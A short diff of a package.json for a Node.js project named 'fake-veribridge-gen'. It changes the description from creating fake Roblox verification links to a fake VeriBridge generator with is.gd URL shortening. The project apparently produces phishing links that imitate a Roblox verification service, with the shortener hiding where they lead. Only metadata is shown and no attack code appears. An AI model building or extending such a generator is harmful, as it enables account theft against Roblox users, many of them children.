@@ -1,7 +1,7 @@
 {
   "name": "fake-veribridge-gen",
   "version": "1.0.0",
-  "description": "Fake VeriBridge Generator - Creates fake Roblox verification links",
+  "description": "Fake VeriBridge Generator with is.gd URL shortening",
   "main": "server.js",
   "scripts": {
     "start": "node server.js"
